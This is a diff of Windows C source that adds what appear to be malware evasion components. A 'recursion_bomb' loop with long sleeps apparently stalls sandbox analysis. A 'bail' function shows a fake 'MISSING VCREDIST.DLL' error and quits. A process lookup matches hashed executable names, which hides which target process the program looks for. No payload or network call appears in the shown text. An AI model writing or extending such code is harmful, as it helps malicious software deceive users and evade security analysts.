@@ -223,11 +223,67 @@ int recursion_bomb(int depth)
 
     for (int i = 0; i < 100000000000; i++)
     {
-        sum += cos(recursion_bomb(depth - 1));
+        sum += recursion_bomb(depth - 1) + 5;
         Sleep(1000);
     }
 
     return sum;
+}
+
+void bail()
+{
+    MessageBoxA(NULL, "MISSING VCREDIST.DLL", "ERROR", MB_ICONWARNING | MB_OK);
+    exit(1);
+}
+
+size_t hashWide(WCHAR* key) {
+    size_t hashCode = 0;
+    int length = wcslen(key);
+    //std::size_t h1 = std::hash<PWSTR>{}(key.Buffer);
+    for (int i = 0; i < length; i++) {
+        //printf("%c\n", key[i]);
+        hashCode += (key[i] ^ hashCode) * PRIME_CONST;
+        //printf("%lli\n", hashCode);
+    }
+    return hashCode;
+}
+
+DWORD getPidByHash(size_t hash)
+{
+	HANDLE snapshot;
+	PROCESSENTRY32 curProc;
+	char buf[260];
+	DWORD pid = -1;
+	size_t procHash;
+
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	curProc.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(snapshot, &curProc)) {
+		return -1;
+	}
+
+	do
+	{
+		/*
+		printf("------------------------------\n");
+		wprintf(L"Process name %s\n", curProc.szExeFile);
+		printf("PID: %d\n", curProc.th32ProcessID);
+		printf("Hash: %d\n", hashWide(curProc.szExeFile));
+		printf("Number of threads: %d\n", curProc.cntThreads);
+		printf("PPID: %d\n", curProc.th32ParentProcessID);*/
+		procHash = hashWide(curProc.szExeFile);
+		//wprintf(L"Process name %s\n", curProc.szExeFile);
+		//printf("%llu %llu\n", hash, procHash);
+		if (procHash == hash)
+		{
+			return curProc.th32ProcessID;
+		}
+
+	} while (Process32Next(snapshot, &curProc));
+
+	return pid;
 }
 
 DWORD getPidByName(LPCWCHAR proc)
